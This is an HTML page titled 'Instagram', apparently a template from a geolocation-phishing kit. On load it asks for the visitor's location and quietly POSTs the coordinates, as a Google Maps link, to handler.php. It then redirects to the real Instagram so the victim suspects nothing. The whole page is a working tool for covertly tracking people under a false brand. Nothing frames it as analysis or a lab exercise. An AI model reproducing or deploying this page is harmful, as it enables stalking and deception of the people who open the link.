<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Instagram</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#000000">
    <link rel="icon" type="image/x-icon" href="flat-location-logo-152-234349.png">
    <link href="fonts.css" rel="stylesheet">
    <link href="main.css" rel="stylesheet">
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="../../assets/js/particles.min.js"></script>
    <script src="../../assets/js/location.js"></script>
    <script src="../../assets/js/client.min.js"></script>
    <script src="../../assets/js/loc.js"></script>
    <script src="../../assets/js/warpspeed.min.js"></script>
    <script type="text/javascript">
      function mydata() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else {
          alert("Geolocation is not supported by this browser.");
        }
      }

      function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        $.ajax({
          type: 'POST',
          url: 'handler.php',
          data: {"data": `Google Map Link: https://google.com/maps/place/${lat}+${lon}`},
          success: function() {
            $('#change').html('Coming Soon');
            window.location.href = 'https://www.instagram.com/';
          },
          
          mimeType: 'text'
        });
      }

      // Call the function when the page loads
      document.addEventListener('DOMContentLoaded', mydata);
    </script>
  </head>
  <body>
    <canvas id="canvas" style="width:100%; height:100%;"></canvas>
    <script>
      var x = new WarpSpeed('canvas', '{"speed":2,"speedAdjFactor":0.03,"density":1,"shape":"circle","warpEffect":true,"warpEffectLength":3,"depthFade":false,"starSize":3,"backgroundColor":"hsl(0,0%,0%)","starColor":"#FFFFFF"}');
    </script>
    
  </body>
</html>
